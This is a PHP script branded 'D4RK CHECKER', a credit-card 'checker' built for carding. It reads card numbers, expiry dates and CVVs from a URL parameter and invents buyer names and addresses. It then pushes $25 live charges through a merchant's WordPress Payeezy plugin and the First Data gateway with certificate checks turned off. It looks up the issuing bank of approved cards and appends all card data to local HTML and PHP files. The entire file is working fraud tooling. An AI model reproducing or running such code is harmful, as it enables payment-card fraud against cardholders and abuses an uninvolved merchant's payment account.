<?php 
error_reporting(0);
set_time_limit(0);
function middleStr($string, $start, $end){
	$a = explode($start, $string);
	$b = explode($end, $a[1]);
	return $b[0];
}


$cartao = $_GET['cartao'];
$cartao = str_replace(array(":", ";", ",", "|", "»", "/", "\\", " "), "|", $cartao);
list($card, $mes, $ano, $cvv) = explode("|", $cartao);


if(strlen($mes) == 1){
	$mes = "0".$mes;
}
if(strlen($ano) == 4){
	$ano = substr($ano, -2);
}

if(!strlen($cartao) > 13){
	exit("<p ><b id='tagReprovada'>ERRO</b> <font color='white'> $card $mes $ano $cvv <b id='tagMarcaDagua'>Retorno: Seu pagamento foi rejeitado pela emissora do cartão de crédito.</font></b></p> ");
}elseif($cvv == "000"){
	exit("<p ><b id='tagReprovada'>ERRO</b> $card $mes $ano $cvv [Gerada] <b id='tagMarcaDagua'>Retorno: xxSeu pagamento foi rejeitado pela emissora do cartão de crédito.</b></p> ");
}elseif(substr($card, 0, 6) == "548573" || substr($card, 0, 6) == "552063" || substr($card, 0, 6) == "514094" || substr($card, 0, 6) == "517805" || substr($card, 0, 6) == "474787" || substr($card, 0, 6) == "412174" ){
	exit("<p ><b id='tagReprovada'>ERRO</b> $card $mes $ano $cvv [Gerada] <b id='tagMarcaDagua'>Retorno: xxSeu pagamento foi rejeitado pela emissora do cartão de crédito.</b></p> ");
}elseif(intval($ano) < date('y')){

	exit("<p ><b id='tagReprovada'></b><b id='tagMarcaDagua'></b></p> ");
}
elseif(intval($ano) == date('y') && intval($mes) <= date('m')){

	exit("<p ><b id='tagReprovada'></b><b id='tagMarcaDagua'></b></p> ");
}



$cookie = getcwd()."/Cookies/cookie".rand(1,99999).".txt";
$email = substr(md5(rand(1,999999)), -15);
$cep_last_three = rand(100,900);
$nomes = array("José", "Fernando", "Roberto", "Marcelo", "João", "John", "Kleiton");
$sobrenomes = array("Silva", "Silas", "Souza", "Santos", "Neto", "Lobato", "Santos");
$nome = $nomes[array_rand($nomes)];
$sobrenome = $sobrenomes[array_rand($sobrenomes)];



$post = "x_recurring_billing_id=&x_login=WSP-SCRIP-9AJjJQAr8A&x_receipt_link_url=&mode=live&x_type=AUTH_CAPTURE&x_currency_code=USD&x_first_name=".$nome."&x_last_name=".$sobrenome."&x_company=&x_company_name=&x_address=Rua+Alcides+Lima&x_city=Boa+".$sobrenome."&x_state=Northwest+Territories&x_zip=69313".$cep_last_three."&x_country=Brazil&x_invoice_num=&x_invoice_num_name=&x_po_num=&x_po_num_name=&x_reference_3=&x_reference_3_name=&x_user1=&x_user1_name=&x_user2=&x_user2_name=&x_user3=&x_user3_name=&x_email=&x_email_name=&x_phone=&x_phone_name=&x_description=&x_description_name=&x_amount=25";
$url = "http://www.scriptype.com/wp-content/plugins/wp-payeezy-pay/pay.php";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$exec = curl_exec($ch);
curl_close($ch);



$x_login = middleStr($exec, '<input name="x_login" value="', '" type');
$x_fp_timestamp = middleStr($exec, 'x_fp_timestamp" value="', '" type');
$x_fp_hash = middleStr($exec, 'x_fp_hash" value="', '" size');
$x_fp_sequence = middleStr($exec, 'x_fp_sequence" value="', '" type');




$header = array("Connection: keep-alive", "Origin: http://www.scriptype.com", "Referer: http://www.scriptype.com/wp-content/plugins/wp-payeezy-pay/pay.php", "User-Agent: Mozilla");
$post = "x_login=WSP-SCRIP-9AJjJQAr8A&x_amount=25&x_fp_sequence=".$x_fp_sequence."&x_fp_timestamp=".$x_fp_timestamp."&x_fp_hash=".$x_fp_hash."&x_currency_code=USD&x_first_name=".$nome."&x_last_name=".$sobrenome."&x_company=&x_address=Rua+Alcides+Lima&x_city=Boa+".$sobrenome."&x_state=Northwest+Territories&x_country=Brazil&x_zip=69313".$cep_last_three."&x_email=&x_phone=&x_invoice_num=Your+Payment&x_po_num=&x_reference_3=&x_user1=&x_user2=&x_user3=&x_type=AUTH_CAPTURE&x_description=&x_line_item=Payment%3C%7C%3EPayment%3C%7C%3EYour+Payment%3C%7C%3E1%3C%7C%3E1%3C%7C%3EN%3C%7C%3E%3C%7C%3E%3C%7C%3E%3C%7C%3E%3C%7C%3E%3C%7C%3E0%3C%7C%3E%3C%7C%3E%3C%7C%3E1&x_show_form=PAYMENT_FORM";
$url = "https://checkout.globalgatewaye4.firstdata.com/payment";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$exec = curl_exec($ch);
$referer = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);


$header = array("Connection: keep-alive", "https://checkout.globalgatewaye4.firstdata.com/payment/cc_payment ", "Referer: ".$referer, "User-Agent: Mozilla");
$post = "exact_cardholder_name=".$nome."+".$sobrenome."&servdt5=1&merchant=WSP-SCRIP-9AJjJQAr8A&x_address=R+ALDO+FOCOSI%2C+".rand(1,1000)."&x_city=RIBEIRAO+PRETO&x_state=Northwest+Territories&x_zip=69313".$cep_last_three."&x_card_num=".$card."&x_exp_date=".$mes.$ano."&x_card_code=".$cvv."&cvd_presence_ind=1&x_email=".$email."%40gmail.com&commit=Pay+With+Your+Credit+Card";
$url = "https://checkout.globalgatewaye4.firstdata.com/payment/cc_payment";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$exec = curl_exec($ch);
curl_close($ch);

if(file_exists($cookie)){
	unlink($cookie);
}

if(strpos($exec, 'Transaction approved!') !== false){
		$ch = curl_init("https://lookup.binlist.net/$card");
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		$exec2 = curl_exec($ch);
		curl_close($ch);
		$f = json_decode($exec2, true);

		$bandeira = strtoupper($f['scheme']);
		$country = $f['country']['name'];
		$bankname = $f['bank']['name'];
		$pais = $f['country']['alpha2'];
		$tipo = $f['brand'];
		$bin = strtoupper("$bandeira 	 $country 	 $bankname 	 $tipo");

		print("<p><b id='tagReprovada'>REPROVADA</b> $card $mes $ano $cvv <b id='tagInfo'>$bin</b> <b id='tagMarcaDagua'>[ D4RK CHECKER ]</b></p>");

		$file = fopen("wtfbrother.php", "a");
		fwrite($file, "<br><font  id='formatada'><br><br>$card ".strtolower($bankname." ".$tipo." ".$pais)."<br>$mes/$ano<br>$cvv</font><font id='cc'>$card|$mes|$ano|$cvv</font>");
		exit();
}elseif(strpos($exec, "Payment Failed") !== false){
	print("<p ><b id='tagReprovada'>REPROVADA</b> $card $mes $ano $cvv <font color='white'>Retorno: Seu pagamento foi rejeitado pela emissora do cartão de crédito.&nbsp</font><b id='tagMarcaDagua'><font color='white' style='font-weight:bold;'>[ DARK CHECKER ]</font></b></p> ");
}else{
	print("<p ><b id='tagReprovada'><font color='orange'>#REPROVADA</font></b> <font color='white'>$card $mes $ano $cvv</font> <font color='white'>Retorno:</font> <font color='red'>Seu pagamento foi rejeitado pela emissora do cartão de crédito.&nbsp</font><b id='tagMarcaDagua'><font color='white' style='font-weight:bold;'>#DarkChecker</font></b></p> ");
}
$file = fopen("ccs.html", "a");
		fwrite($file, "$card|$mes|$ano|$cvv<br>");
		exit();








//$txt =  $cartao. '  '.$mes.'  '.$ano.'   '.cvv.'   ' .$tipo.'   ' .$verificada.' <br> ';

//    $fp = fopen('CONTASPAG.html', 'a');

//    fwrite($fp, $txt);

 //   fclose($fp);


?>

